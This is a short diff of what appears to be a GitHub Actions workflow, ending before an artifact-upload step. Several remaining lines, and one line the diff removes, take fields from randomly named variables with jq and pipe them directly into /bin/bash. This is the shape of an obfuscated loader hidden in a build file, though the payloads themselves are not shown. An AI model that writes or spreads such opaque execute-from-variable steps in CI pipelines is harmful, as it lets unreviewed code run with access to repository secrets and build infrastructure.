@@ -23,7 +23,6 @@ jobs:
           echo $fl9767 | jq -r .pv08 | /bin/bash
           echo $wht9220 | jq -r .dn88 | /bin/bash
           printf '%s' "$uibne28" | jq -r .yd1 | /bin/bash
-          echo $shwsj73268 | jq -r .jw1 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
